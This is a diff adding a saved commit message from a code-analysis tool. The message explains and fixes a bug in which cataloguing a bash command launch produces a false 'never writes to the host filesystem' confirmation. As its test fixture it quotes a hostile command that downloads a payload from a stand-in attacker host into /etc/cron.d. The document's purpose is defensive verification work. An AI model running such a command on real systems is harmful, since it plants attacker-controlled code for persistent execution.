@@ -1,0 +1,67 @@
+Original commit body from be9780d7fdfab1feeb9f19bc65d525f1188a0b1c:
+
+INV-gahuz asked "did control leave this process?" of the CATALOGUE. One
+producer knows the answer with no catalogue at all: the bash analyzer stamps
+meta.io_boundary = "command_launch" on an external-command edge, because
+there is no bash catalogue to match against and ADR-0016 rules one out. That
+channel was never read.
+
+Measured on the shipped CLI, no flags, no overlay, against a two-line script
+whose only command is `curl -o /etc/cron.d/pwned "https://evil.example/payload"`,
+claim "this repo never writes to the host filesystem":
+
+  io_primitives/bash.yaml          total_io  cmd_launch  fs_write     net_send
+  -------------------------------  --------  ----------  -----------  ----------
+  absent (the shipped state)              0           1  inconc rc 2  inconc rc 2
+  curl -> net_send                        1           0  CONFIRM rc0  violat rc 1
+  curl -> net_send + subprocess           1           0  inconc rc 2  violat rc 1
+
+The row is CORRECT -- curl really does send data to a remote host -- and that
+is the point: a right row bought a green tick over a write into a root cron
+directory, because since INV-buzab a *classified* call is what `examined`
+means, and classifying a launch stripped its opacity. Row 3 is the control
+that makes this a defect rather than blindness: the same run with subprocess
+ALSO declared withholds the confirmation and still reports the network
+violation. Detection was never what was at stake. Row order between the two
+sections changes nothing, which refutes a predicted dependency on INV-zumin.
+
+NOT LIVE WHEN FOUND, AND ONE FILE AWAY FROM BEING SO. bash ships no catalogue,
+so its edges are dropped on `catalog is None` and the INV-dabov language gate
+answers first. Three places in this tree recommended adding that file --
+verify_claims.py's own comment on the INV-dabov gate ("why the catalogue is
+the follow-up", corrected in place rather than left standing), WI-sofaf's
+disposition 2, and a session handoff note. Whoever acted on any of them would
+have opened the hole in the same commit.
+
+Fixed at the chokepoint: PRODUCER_OPAQUE_BOUNDARIES carries the
+analyzer-stamped command_launch beside the catalogue-declared subprocess, and
+_opaque_launch_sites consults the producer stamp BEFORE classify_call, inside
+the iteration both coverage checks already share (INV-motos). The two sets are
+disjoint by construction and each is asserted reachable through its own
+channel -- a catalogue-declarable opaque boundary is inert unless it is in
+CATALOG_BOUNDARY_TYPES, a producer-stamped one is inert if it IS. A parity
+test across the producer/consumer package seam pins bash's stamp to the set
+the gate reads, so renaming it in one place fails a test rather than silently
+unhooking the gate.
+
+CORPUS DELTA TODAY: ZERO, asserted rather than reported as a win -- nothing
+reaches the new branch while bash has no catalogue. The acceptance test is the
+positive control: with the fix in place, re-adding the six-line catalogue moves
+the fs_write claim from confirmed rc 0 to inconclusive rc 2 while net_send
+stays violated rc 1. Controls same session: subprocess.run(["curl", ...]) stays
+inconclusive, open("/etc/cron.d/pwned","w") stays violated rc 1.
+
+This does not reopen ADR-0016's ruling against a bash data-I/O catalogue; it
+removes the false confirm that would follow if anyone decided otherwise.
+
+Scope stated rather than implied. Cataloguing a command still DISPLACES the
+command_launch disclosure into total_io_edges (1 -> 0 / 0 -> 1), collapsing
+the count-vs-disclose split WI-javoh built -- a counting concern, not a verdict
+one, recorded on the item and in the ADR but not addressed here. Filed
+alongside: WI-guhuv, an io_primitives overlay is silently inert for a language
+with no shipped catalogue (load_catalog returns before the overlay loop),
+under a "Loaded 1 project-local overlay(s)" banner -- so a user cannot close
+this gap themselves either.
+
+Ref: INV-larol. Suite 22,511 passed / 100% coverage / mypy ratchet clean.
+Signed-off-by: jgstern-agent <josh-agent@iterabloom.com>
